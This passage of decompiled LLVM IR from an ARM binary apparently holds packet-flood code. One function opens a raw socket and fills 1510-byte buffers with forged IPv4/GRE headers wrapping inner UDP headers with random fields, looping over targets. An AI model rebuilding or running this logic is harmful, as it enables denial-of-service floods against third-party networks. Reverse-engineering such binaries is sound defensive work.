dec_label_pc_935c:                                ; preds = %dec_label_pc_9348, %dec_label_pc_9208
  %v0_935c = call i32 @function_e094()
  %v1_935c = trunc i32 %v0_935c to i16
  store i32 %v0_935c, i32* %r0.global-to-local, align 4
  store i32 %v1_8fbc, i32* %r3.global-to-local, align 4
  store i1 %v2_9364, i1* %cpsr_z.global-to-local, align 1
  %v3_9368 = load i32, i32* @r6, align 4
  %v4_9368 = add i32 %v3_9368, 2
  %v5_9368 = inttoptr i32 %v4_9368 to i16*
  store i16 %v1_935c, i16* %v5_9368, align 2
  br i1 %v2_9364, label %dec_label_pc_9220, label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_9214, %dec_label_pc_935c
  %v0_9370 = load i32, i32* @r5, align 4
  %v1_9370 = add i32 %v0_9370, 28
  store i32 %v1_9370, i32* %r0.global-to-local, align 4
  store i32 %v0_9088, i32* %r1.global-to-local, align 4
  %v2_9378 = inttoptr i32 %v1_9370 to i16*
  %v3_9378 = call i32 @function_e228(i16* %v2_9378, i32 %v0_9088)
  store i32 %v3_9378, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9220

dec_label_pc_9380:                                ; preds = %dec_label_pc_8ff4
  %v0_9380 = load i32, i32* @fp, align 4
  store i32 %v0_9380, i32* %r0.global-to-local, align 4
  %v1_9384 = call i32 @function_10be0(i32 %v0_9380)
  store i32 %v1_9384, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_8eac, %dec_label_pc_9380
  %v1_9390 = phi i32 [ %v3_8fe4, %dec_label_pc_8eac ], [ %v1_9384, %dec_label_pc_9380 ]
  store i32 %v18_8eac, i32* %sb.global-to-local, align 4
  store i32 %v27_8eac, i32* %lr.global-to-local, align 4
  ret i32 %v1_9390

; uselistorder directives
  uselistorder i32 %v0_935c, { 1, 0 }
  uselistorder i32 %v0_9348, { 1, 0 }
  uselistorder i32 %v1_9340, { 1, 0 }
  uselistorder i32 %v3_92b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_9294, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_9260, { 1, 0 }
  uselistorder i32 %v4_9250, { 1, 0 }
  uselistorder i1 %v2_9364, { 2, 3, 1, 0 }
  uselistorder i1 %v3_9328, { 3, 2, 0, 1 }
  uselistorder i32 %v3_90d4, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_90bc, { 1, 0 }
  uselistorder i32 %v1_908c, { 1, 0, 2 }
  uselistorder i32 %v1_9088, { 1, 0, 2 }
  uselistorder i32 %v3_9060, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9048, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9040, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_9038, { 1, 0, 2 }
  uselistorder i32 %v0_9088, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_9028, { 3, 1, 2, 0 }
  uselistorder i1 %v7_9014, { 1, 0 }
  uselistorder i1 %v7_8fe8, { 1, 0 }
  uselistorder i32 %v3_8fe4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_8fd0, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_8fbc, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8f48, { 1, 0 }
  uselistorder i32 %v1_8f24, { 1, 0 }
  uselistorder i32 %v6_8f1c, { 1, 0 }
  uselistorder i32 %v7_8f04, { 1, 0, 2, 3 }
  uselistorder i8 %v5_8f00, { 1, 0 }
  uselistorder i32 %v6_8ee0, { 1, 0 }
  uselistorder i32 %v2_8ec8, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 31, 30, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 46, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 33, 29, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9388, { 1, 0 }
  uselistorder label %dec_label_pc_9370, { 1, 0 }
  uselistorder label %dec_label_pc_9220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_91b4, { 1, 0 }
  uselistorder label %dec_label_pc_91a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_91a4.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @function_9398(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9398:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9398 = load i32, i32* @r4, align 4
  %v6_9398 = load i32, i32* @r5, align 4
  %v24_9398 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_93b4 = call i32 @function_11f24(i32 %arg1, i32 4)
  %v0_93b8 = load i32, i32* @r5, align 4
  store i32 %v0_93b8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_93c8 = load i32, i32* @r4, align 4
  store i32 %v0_93c8, i32* %r0.global-to-local, align 4
  %v5_93cc = inttoptr i32 %v0_93b8 to i32*
  %v6_93cc = call i32 @function_8570(i32 %v0_93c8, i32* %v5_93cc, i32 2, i32 0)
  %v1_93d8 = urem i32 %v6_93cc, 256
  store i32 %v1_93d8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_93e4 = load i32, i32* @r5, align 4
  store i32 %v0_93e4, i32* %r1.global-to-local, align 4
  %v0_93e8 = load i32, i32* @r4, align 4
  store i32 %v0_93e8, i32* %r0.global-to-local, align 4
  %v5_93ec = trunc i32 %v6_93cc to i8
  %v6_93f0 = inttoptr i32 %v0_93e4 to i32*
  %v7_93f0 = call i32 @function_8570(i32 %v0_93e8, i32* %v6_93f0, i32 3, i32 65535)
  %v0_93f4 = load i32, i32* @r5, align 4
  store i32 %v0_93f4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_93f0, i32* %fp.global-to-local, align 4
  %v0_9404 = load i32, i32* @r4, align 4
  store i32 %v0_9404, i32* %r0.global-to-local, align 4
  %v4_9408 = inttoptr i32 %v0_93f4 to i32*
  %v5_9408 = call i32 @function_8570(i32 %v0_9404, i32* %v4_9408, i32 4, i32 64)
  %v1_9410 = urem i32 %v5_9408, 256
  store i32 %v1_9410, i32* %ip.global-to-local, align 4
  %v0_9414 = load i32, i32* @r5, align 4
  store i32 %v0_9414, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9420 = load i32, i32* @r4, align 4
  store i32 %v0_9420, i32* %r0.global-to-local, align 4
  %v6_9428 = inttoptr i32 %v0_9414 to i32*
  %v7_9428 = call i32 @function_8570(i32 %v0_9420, i32* %v6_9428, i32 5, i32 1)
  %v1_9434 = urem i32 %v7_9428, 256
  store i32 %v1_9434, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9440 = load i32, i32* @r5, align 4
  store i32 %v0_9440, i32* %r1.global-to-local, align 4
  %v0_9444 = load i32, i32* @r4, align 4
  store i32 %v0_9444, i32* %r0.global-to-local, align 4
  %v5_944c = inttoptr i32 %v0_9440 to i32*
  %v6_944c = call i32 @function_8570(i32 %v0_9444, i32* %v5_944c, i32 6, i32 65535)
  %v0_9454 = load i32, i32* @r5, align 4
  store i32 %v0_9454, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_944c, i32* @r8, align 4
  %v0_9464 = load i32, i32* @r4, align 4
  store i32 %v0_9464, i32* %r0.global-to-local, align 4
  %v4_9468 = inttoptr i32 %v0_9454 to i32*
  %v5_9468 = call i32 @function_8570(i32 %v0_9464, i32* %v4_9468, i32 7, i32 65535)
  %v0_946c = load i32, i32* @r5, align 4
  store i32 %v0_946c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9468, i32* @r7, align 4
  %v0_947c = load i32, i32* @r4, align 4
  store i32 %v0_947c, i32* %r0.global-to-local, align 4
  %v4_9480 = inttoptr i32 %v0_946c to i32*
  %v5_9480 = call i32 @function_8570(i32 %v0_947c, i32* %v4_9480, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9490 = load i32, i32* @r5, align 4
  store i32 %v0_9490, i32* %r1.global-to-local, align 4
  %v0_9494 = load i32, i32* @r4, align 4
  store i32 %v0_9494, i32* %r0.global-to-local, align 4
  %v4_9498 = inttoptr i32 %v0_9490 to i32*
  %v5_9498 = call i32 @function_8570(i32 %v0_9494, i32* %v4_9498, i32 1, i32 1)
  %v1_94a0 = urem i32 %v5_9498, 256
  store i32 %v1_94a0, i32* %ip.global-to-local, align 4
  %v0_94a4 = load i32, i32* @r5, align 4
  store i32 %v0_94a4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_94b0 = load i32, i32* @r4, align 4
  store i32 %v0_94b0, i32* %r0.global-to-local, align 4
  %v5_94b8 = inttoptr i32 %v0_94a4 to i32*
  %v6_94b8 = call i32 @function_8570(i32 %v0_94b0, i32* %v5_94b8, i32 19, i32 0)
  %v0_94c0 = load i32, i32* @r5, align 4
  store i32 %v0_94c0, i32* %r1.global-to-local, align 4
  %v2_94c4 = load i32, i32* @global_var_20780.45, align 4
  store i32 %v2_94c4, i32* %r3.global-to-local, align 4
  store i32 %v6_94b8, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_94d0 = load i32, i32* @r4, align 4
  store i32 %v0_94d0, i32* %r0.global-to-local, align 4
  %v4_94d4 = inttoptr i32 %v0_94c0 to i32*
  %v5_94d4 = call i32 @function_8570(i32 %v0_94d0, i32* %v4_94d4, i32 25, i32 %v2_94c4)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_94e8 = call i32 @function_113bc(i32 2, i32 3, i32 6)
  store i32 %v3_94e8, i32* %r0.global-to-local, align 4
  %v7_94ec = icmp eq i32 %v3_94e8, -1
  store i1 %v7_94ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_94ec, label %dec_label_pc_9a00, label %dec_label_pc_94f8

dec_label_pc_94f8:                                ; preds = %dec_label_pc_9398
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9500 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9500, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9514 = call i32 @function_11378(i32 %v3_94e8, i32 0, i32 3, i32 %v6_9500, i32 4)
  store i32 %v5_9514, i32* %r0.global-to-local, align 4
  %v7_9518 = icmp eq i32 %v5_9514, -1
  store i1 %v7_9518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9518, label %dec_label_pc_99f8, label %dec_label_pc_9520

dec_label_pc_9520:                                ; preds = %dec_label_pc_94f8
  %v0_9520 = load i32, i32* @r8, align 4
  %v0_9524 = load i32, i32* @r7, align 4
  %v0_9528 = load i32, i32* %fp.global-to-local, align 4
  %v0_952c = load i32, i32* @r6, align 4
  %v1_952c = urem i32 %v0_952c, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9534 = urem i32 %v0_9520, 65536
  store i32 %v3_9534, i32* %r3.global-to-local, align 4
  %v3_9538 = urem i32 %v0_9524, 65536
  store i32 %v3_9538, i32* %r4.global-to-local, align 4
  %v0_953c = load i32, i32* @sl, align 4
  %v2_953c = icmp eq i32 %v0_953c, 0
  store i1 %v2_953c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9554 = urem i32 %v0_9528, 65536
  store i32 %v3_9554, i32* @fp, align 4
  br i1 %v2_953c, label %dec_label_pc_9a0c, label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9520
  %v3_9524 = mul i32 %v0_9524, 65536
  %v3_9520 = mul i32 %v0_9520, 65536
  %v0_9528.not = or i32 %v0_9528, -65536
  %v1_9568 = xor i32 %v0_9528.not, 65535
  %v3_956c = mul i32 %v5_9480, 65536
  %v1_9570 = add i32 %v3_956c, 4325376
  %tmp73 = udiv i32 %v1_9570, 256
  %v3_9584 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_9568, 256
  %v3_9588 = and i32 %tmp74, 65280
  store i32 %v3_9588, i32* %ip.global-to-local, align 4
  %v1_958c = add i32 %v3_956c, 524288
  %v1_9594 = add i32 %v3_956c, 1835008
  %tmp75 = udiv i32 %v1_9568, 256
  %v4_9598 = urem i32 %tmp75, 256
  %v5_9598 = or i32 %v4_9598, %v3_9588
  %v4_95a0 = udiv i32 %v1_9570, 16777216
  %v5_95a0 = or i32 %v3_9584, %v4_95a0
  store i32 %v5_95a0, i32* @r8, align 4
  %v3_95ac = udiv i32 %v1_9594, 256
  %tmp76 = mul i32 %v0_9528, 256
  %v3_95b0 = and i32 %tmp76, 65280
  store i32 %v3_9520, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_9528, 256
  %v4_95c0 = urem i32 %tmp77, 256
  %v5_95c0 = or i32 %v4_95c0, %v3_95b0
  store i32 %v5_95c0, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_9520, 256
  %v3_95c4 = and i32 %tmp78, 65280
  %v1_95c8 = and i32 %v3_95ac, 65280
  store i32 %v1_95c8, i32* @r6, align 4
  store i32 %v3_9524, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_9524, 256
  %v3_95d4 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_9520, 256
  %v4_95d8 = urem i32 %tmp80, 256
  %v5_95d8 = or i32 %v4_95d8, %v3_95c4
  store i32 %v5_95d8, i32* @lr, align 4
  %v4_95dc = udiv i32 %v1_9594, 16777216
  %v5_95dc = or i32 %v1_95c8, %v4_95dc
  store i32 %v5_95dc, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_9524, 256
  %v4_95e0 = urem i32 %tmp81, 256
  %v5_95e0 = or i32 %v4_95e0, %v3_95d4
  %tmp82 = udiv i32 %v1_958c, 256
  %v3_95e4 = and i32 %tmp82, 65280
  store i32 %v3_95e4, i32* @r5, align 4
  %v5_95e8 = trunc i32 %v5_95c0 to i16
  %v5_95f0 = trunc i32 %v5_95dc to i16
  %v4_95f8 = udiv i32 %v1_958c, 16777216
  %v5_95f8 = or i32 %v3_95e4, %v4_95f8
  store i32 %v5_95f8, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9654 = sext i8 %v5_93ec to i32
  %v1_9660 = trunc i32 %v5_9408 to i8
  %sext = mul nuw i32 %v5_9598, 65536
  %v4_96ec = sdiv i32 %sext, 65536
  %v2_9718 = icmp eq i32 %v1_952c, 0
  %sext8 = mul nuw i32 %v5_95d8, 65536
  %v4_9738 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_95e0, 65536
  %v4_9740 = sdiv i32 %sext9, 65536
  %v1_96f827 = trunc i32 %v4_96ec to i16
  br label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %bb85, %dec_label_pc_9564
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_960c = call i32 @function_11f24(i32 1510, i32 4)
  store i32 %v2_960c, i32* %r0.global-to-local, align 4
  %v2_9614 = load i32, i32* @r4, align 4
  %v5_9614 = mul i32 %v2_9614, 4
  %v6_9614 = add i32 %v5_9614, %v2_93b4
  %v7_9614 = inttoptr i32 %v6_9614 to i32*
  store i32 %v2_960c, i32* %v7_9614, align 4
  %v3_9618 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9618, i32* %r2.global-to-local, align 4
  %v5_9620 = mul i32 %v3_9618, 24
  %v1_9624 = load i32, i32* @sb, align 4
  %v2_9624 = add i32 %v1_9624, %v5_9620
  store i32 %v2_9624, i32* @lr, align 4
  store i32 %v2_93b4, i32* %r3.global-to-local, align 4
  %v4_962c = mul i32 %v3_9618, 4
  %v5_962c = add i32 %v4_962c, %v2_93b4
  %v6_962c = inttoptr i32 %v5_962c to i32*
  %v7_962c = load i32, i32* %v6_962c, align 4
  store i32 %v7_962c, i32* %r4.global-to-local, align 4
  %v1_9630 = inttoptr i32 %v7_962c to i8*
  %v2_9630 = load i8, i8* %v1_9630, align 1
  %tmp = urem i8 %v2_9630, 16
  %v1_9634 = zext i8 %tmp to i32
  %v1_9638 = or i32 %v1_9634, 64
  store i32 %v1_9638, i32* %r3.global-to-local, align 4
  %v1_963c = trunc i32 %v1_9638 to i8
  store i8 %v1_963c, i8* %v1_9630, align 1
  %v0_9640 = load i32, i32* %r4.global-to-local, align 4
  %v1_9640 = inttoptr i32 %v0_9640 to i8*
  %v2_9640 = load i8, i8* %v1_9640, align 1
  %v1_9644 = and i8 %v2_9640, -16
  %v1_9648 = or i8 %v1_9644, 5
  store i32 %v1_9434, i32* %r5.global-to-local, align 4
  store i8 %v1_9648, i8* %v1_9640, align 1
  store i32 %v4_9654, i32* %r1.global-to-local, align 4
  %v2_9658 = load i32, i32* %r4.global-to-local, align 4
  %v3_9658 = add i32 %v2_9658, 1
  %v4_9658 = inttoptr i32 %v3_9658 to i8*
  store i8 %v5_93ec, i8* %v4_9658, align 1
  store i32 %v1_9410, i32* %r2.global-to-local, align 4
  %v2_9660 = load i32, i32* %r4.global-to-local, align 4
  %v3_9660 = add i32 %v2_9660, 8
  %v4_9660 = inttoptr i32 %v3_9660 to i8*
  store i8 %v1_9660, i8* %v4_9660, align 1
  %v2_9668 = load i32, i32* %r4.global-to-local, align 4
  %v3_9668 = add i32 %v2_9668, 4
  %v4_9668 = inttoptr i32 %v3_9668 to i16*
  store i16 %v5_95e8, i16* %v4_9668, align 2
  %v2_9670 = load i32, i32* %r4.global-to-local, align 4
  %v3_9670 = add i32 %v2_9670, 9
  %v4_9670 = inttoptr i32 %v3_9670 to i8*
  store i8 47, i8* %v4_9670, align 1
  store i32 %v5_94d4, i32* %r3.global-to-local, align 4
  %v0_9678 = load i32, i32* %r5.global-to-local, align 4
  %v2_9678 = icmp eq i32 %v0_9678, 0
  store i1 %v2_9678, i1* %cpsr_z.global-to-local, align 1
  %v1_967c = load i32, i32* %r4.global-to-local, align 4
  %v2_967c = add i32 %v1_967c, 12
  %v3_967c = inttoptr i32 %v2_967c to i32*
  store i32 %v5_94d4, i32* %v3_967c, align 4
  br i1 %v2_9678, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_9600
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_9684 = load i32, i32* %r4.global-to-local, align 4
  %v4_9684 = add i32 %v3_9684, 6
  %v5_9684 = inttoptr i32 %v4_9684 to i16*
  store i16 64, i16* %v5_9684, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_9600, %bb
  %v0_9688 = load i32, i32* @lr, align 4
  %v1_9688 = add i32 %v0_9688, 16
  %v2_9688 = inttoptr i32 %v1_9688 to i32*
  %v3_9688 = load i32, i32* %v2_9688, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_9690 = load i32, i32* %r4.global-to-local, align 4
  %v2_9690 = add i32 %v1_9690, 16
  %v3_9690 = inttoptr i32 %v2_9690 to i32*
  store i32 %v3_9688, i32* %v3_9690, align 4
  %v0_9694 = load i32, i32* %r4.global-to-local, align 4
  %v1_9694 = add i32 %v0_9694, 24
  store i32 %v1_9694, i32* %r1.global-to-local, align 4
  %v1_9698 = add i32 %v0_9694, 20
  store i32 %v1_9698, i32* %r0.global-to-local, align 4
  %v0_969c = load i32, i32* %ip.global-to-local, align 4
  %v1_969c = add i32 %v0_969c, 101
  store i32 %v1_969c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_96a8 = load i32, i32* @r8, align 4
  %v1_96a8 = trunc i32 %v0_96a8 to i16
  %v3_96a8 = add i32 %v0_9694, 2
  %v4_96a8 = inttoptr i32 %v3_96a8 to i16*
  store i16 %v1_96a8, i16* %v4_96a8, align 2
  %v0_96ac = load i32, i32* %ip.global-to-local, align 4
  %v1_96ac = trunc i32 %v0_96ac to i16
  %v2_96ac = load i32, i32* %r0.global-to-local, align 4
  %v3_96ac = add i32 %v2_96ac, 2
  %v4_96ac = inttoptr i32 %v3_96ac to i16*
  store i16 %v1_96ac, i16* %v4_96ac, align 2
  %v0_96b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96b0 = trunc i32 %v0_96b0 to i8
  %v2_96b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_96b0 = add i32 %v2_96b0, 13
  %v4_96b0 = inttoptr i32 %v3_96b0 to i8*
  store i8 %v1_96b0, i8* %v4_96b0, align 1
  %v0_96b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_96b4 = trunc i32 %v0_96b4 to i8
  %v2_96b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_96b4 = add i32 %v2_96b4, 12
  %v4_96b4 = inttoptr i32 %v3_96b4 to i8*
  store i8 %v1_96b4, i8* %v4_96b4, align 1
  %v0_96b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_96b8 = add i32 %v0_96b8, 38
  %v2_96b8 = inttoptr i32 %v1_96b8 to i8*
  %v3_96b8 = load i8, i8* %v2_96b8, align 1
  %tmp89 = urem i8 %v3_96b8, 16
  %v1_96bc = zext i8 %tmp89 to i32
  %v1_96c0 = or i32 %v1_96bc, 64
  store i32 %v1_96c0, i32* %r3.global-to-local, align 4
  %v1_96c4 = trunc i32 %v1_96c0 to i8
  store i8 %v1_96c4, i8* %v2_96b8, align 1
  %v0_96c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_96c8 = add i32 %v0_96c8, 38
  %v2_96c8 = inttoptr i32 %v1_96c8 to i8*
  %v3_96c8 = load i8, i8* %v2_96c8, align 1
  %v1_96cc = and i8 %v3_96c8, -16
  %v1_96d0 = or i8 %v1_96cc, 5
  store i8 %v1_96d0, i8* %v2_96c8, align 1
  %v0_96dc = load i32, i32* %r4.global-to-local, align 4
  %v1_96dc = add i32 %v0_96dc, 38
  store i32 %v1_96dc, i32* @r5, align 4
  %v3_96e0 = add i32 %v0_96dc, 39
  %v4_96e0 = inttoptr i32 %v3_96e0 to i8*
  store i8 %v5_93ec, i8* %v4_96e0, align 1
  store i32 %v5_95dc, i32* %r2.global-to-local, align 4
  %v2_96e8 = load i32, i32* @r5, align 4
  %v3_96e8 = add i32 %v2_96e8, 2
  %v4_96e8 = inttoptr i32 %v3_96e8 to i16*
  store i16 %v5_95f0, i16* %v4_96e8, align 2
  store i32 %v4_96ec, i32* %r3.global-to-local, align 4
  store i32 %v1_9410, i32* %r1.global-to-local, align 4
  %v0_96f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_96f4, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_96f828 = load i32, i32* @r5, align 4
  %v3_96f829 = add i32 %v2_96f828, 4
  %v4_96f830 = inttoptr i32 %v3_96f829 to i16*
  store i16 %v1_96f827, i16* %v4_96f830, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_96f8 = load i32, i32* @r5, align 4
  %v3_96f8 = add i32 %v2_96f8, 4
  %v4_96f8 = inttoptr i32 %v3_96f8 to i16*
  store i16 %v1_96f827, i16* %v4_96f8, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_9700 = load i32, i32* %r2.global-to-local, align 4
  %v2_9700 = trunc i32 %v1_9700 to i16
  %v3_9700 = load i32, i32* @r5, align 4
  %v4_9700 = add i32 %v3_9700, 6
  %v5_9700 = inttoptr i32 %v4_9700 to i16*
  store i16 %v2_9700, i16* %v5_9700, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_9704 = load i32, i32* %r1.global-to-local, align 4
  %v1_9704 = trunc i32 %v0_9704 to i8
  %v2_9704 = load i32, i32* @r5, align 4
  %v3_9704 = add i32 %v2_9704, 8
  %v4_9704 = inttoptr i32 %v3_9704 to i8*
  store i8 %v1_9704, i8* %v4_9704, align 1
  %v0_9708 = load i32, i32* %r3.global-to-local, align 4
  %v1_9708 = trunc i32 %v0_9708 to i8
  %v2_9708 = load i32, i32* @r5, align 4
  %v3_9708 = add i32 %v2_9708, 9
  %v4_9708 = inttoptr i32 %v3_9708 to i8*
  store i8 %v1_9708, i8* %v4_9708, align 1
  %v0_970c = call i32 @function_e094()
  store i32 %v0_970c, i32* %r0.global-to-local, align 4
  store i32 %v1_952c, i32* %r1.global-to-local, align 4
  store i1 %v2_9718, i1* %cpsr_z.global-to-local, align 1
  %v1_971c = sub i32 1023, %v0_970c
  store i32 %v1_971c, i32* %r3.global-to-local, align 4
  br i1 %v2_9718, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_9724 = load i32, i32* @r5, align 4
  %v3_9724 = add i32 %v2_9724, 16
  %v4_9724 = inttoptr i32 %v3_9724 to i32*
  store i32 %v1_971c, i32* %v4_9724, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_9720 = load i32, i32* %r4.global-to-local, align 4
  %v2_9720 = add i32 %v1_9720, 16
  %v3_9720 = inttoptr i32 %v2_9720 to i32*
  %v4_9720 = load i32, i32* %v3_9720, align 4
  store i32 %v4_9720, i32* %r3.global-to-local, align 4
  %v2_9728 = load i32, i32* @r5, align 4
  %v3_9728 = add i32 %v2_9728, 16
  %v4_9728 = inttoptr i32 %v3_9728 to i32*
  store i32 %v4_9720, i32* %v4_9728, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_972c = load i32, i32* @r5, align 4
  %v2_972c = add i32 %v1_972c, 12
  %v3_972c = inttoptr i32 %v2_972c to i32*
  store i32 %v0_970c, i32* %v3_972c, align 4
  %v3_9730 = load i32, i32* %stack_var_-44, align 4
  %v0_9734 = load i32, i32* %r4.global-to-local, align 4
  %v1_9734 = add i32 %v0_9734, 58
  store i32 %v1_9734, i32* @r6, align 4
  store i32 %v4_9738, i32* %r2.global-to-local, align 4
  %v1_973c = add i32 %v3_9730, 1
  store i32 %v1_973c, i32* @r4, align 4
  store i32 %v4_9740, i32* %r3.global-to-local, align 4
  %v1_9744 = load i32, i32* @sl, align 4
  %v9_9744 = icmp eq i32 %v1_973c, %v1_9744
  store i1 %v9_9744, i1* %cpsr_z.global-to-local, align 1
  %v0_9748 = load i32, i32* @r7, align 4
  %v1_9748 = trunc i32 %v0_9748 to i16
  %v3_9748 = add i32 %v0_9734, 62
  %v4_9748 = inttoptr i32 %v3_9748 to i16*
  store i16 %v1_9748, i16* %v4_9748, align 2
  %v0_974c = load i32, i32* %r2.global-to-local, align 4
  %v1_974c = trunc i32 %v0_974c to i16
  %v2_974c = load i32, i32* @r6, align 4
  %v3_974c = inttoptr i32 %v2_974c to i16*
  store i16 %v1_974c, i16* %v3_974c, align 2
  %v0_9750 = load i32, i32* %r3.global-to-local, align 4
  %v1_9750 = trunc i32 %v0_9750 to i16
